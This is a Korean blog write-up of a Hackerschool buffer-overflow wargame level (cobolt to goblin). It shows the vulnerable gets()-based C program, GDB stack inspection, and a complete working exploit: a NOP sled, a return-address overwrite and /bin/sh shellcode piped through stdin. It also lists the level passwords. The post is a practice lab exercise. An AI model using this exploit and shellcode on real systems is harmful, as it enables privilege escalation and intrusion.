---
layout: post
title: "[Wargame]  해커스쿨 BoF LEVEL3 (cobolt -> goblin) : small buffer + stdin"
date: 2015-11-01 17:30
comments: true
categories:  wargame
tags: [bof]
---

- id = cobolt 
- pw = hacking exposed

<!--more-->

## 문제 : goblin.c

16 bytes small buffer 이며, 외부 입력을 command line argument 가 아니라 stdin 으로 받는 `gets()` 가 사용됨.

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```

## GDB 디버깅 시 stdin 입력하는 방법

이번 문제는 stdin 으로 입력을 넣는데, gdb 로 어떻게 디버깅을 해야하는지 몰랐다.

[gdb - debugging with piped input (not arguments)](http://stackoverflow.com/questions/8422259/gdb-debugging-with-piped-input-not-arguments)

`stdin` 입력을 추가 파일로 저장을 한 후 gdb 실행 한 다음에 `run < input_file` 형식으로 실행을 한다.

```bash
gdb ./vuln_prog
run < filename_with_input
```

Stack 확인하기 위하여 `AA` 을 20bytes 를 넣고

```bash
[cobolt@localhost cobolt]$ python -c 'print "\x90"*20' > test.in

[cobolt@localhost cobolt]$ xxd test.in
0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000010: 9090 9090 0a                             .....
```

GDB 로 붙여서 LR 을 확인해보자. `0xbffffb1c` 에 LR 에 저장된 위치임. 이 값에 뒤에 넣은 shellcode 로 jump 할 위치로 바꾸어주면 된다.

```bash
(gdb) b *main+15
Breakpoint 2 at 0x8048407: file goblin.c, line 10.
(gdb) r < test2.in
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/cobolt/./goblin2 < test2.in

Breakpoint 2, 0x8048407 in main () at goblin.c:10
10          gets(buffer);
(gdb) x/50x $esp
0xbffffb04:     0xbffffb08      0x90909090      0x90909090      0x90909090
0xbffffb14:     0x90909090      0x90909090      0xbffffb34      0x90909090
0xbffffb24:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb34:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb44:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb54:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb64:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb74:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb84:     0x315e18eb      0x074688c0      0x89087689      0x0bb00c46
0xbffffb94:     0x4e8d1e8d      0x0c568d08      0xe3e880cd      0x2fffffff
0xbffffba4:     0x2f6e6962      0xbf006873      0xbffffded      0xbffffdf8
0xbffffbb4:     0xbffffe09      0xbffffe1a      0xbffffe22      0x00000000
0xbffffbc4:     0x00000003      0x08048034
```

## Exploit

```bash
NOP (20) + LR (4) + "\x34\xfb\xff\xbf" + NOP(100) + ShellCode

`python -c 'print "\x90"*20 + "\x34\xfb\xff\xbf" + "\x90"*100 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
```

여기서 또 하나의 문제는 미리 만들어 놓은 값을 `stdin` 으로 실행파일에 넣어주는 형식이다.  (사실 실제로 해보면 이런 내용이 가장 어렵다. 해보지 않으면 절대 알 수 없는 내용이다.)

### stdin 입력

```bash
(python -c 'print "XXXXX"';cat)|./goblin
```

### command line 입력

```bash
./executable `python -c 'print "XXXXX"'`
```

## 최종 실행

```bash
[cobolt@localhost cobolt]$ /bin/bash2
[cobolt@localhost cobolt]$ (python -c 'print "\x90"*20 + "\x34\xfb\xff\xbf" + "\x90"*100 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"';cat)|./goblin
4^1F嵬bin/sh
id
uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)

my-pass
euid = 503
hackers proof
```

### Final exploit

```bash
(python -c 'print "\x90"*20 + "\x34\xfb\xff\xbf" + "\x90"*100 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"';cat)|./goblin
```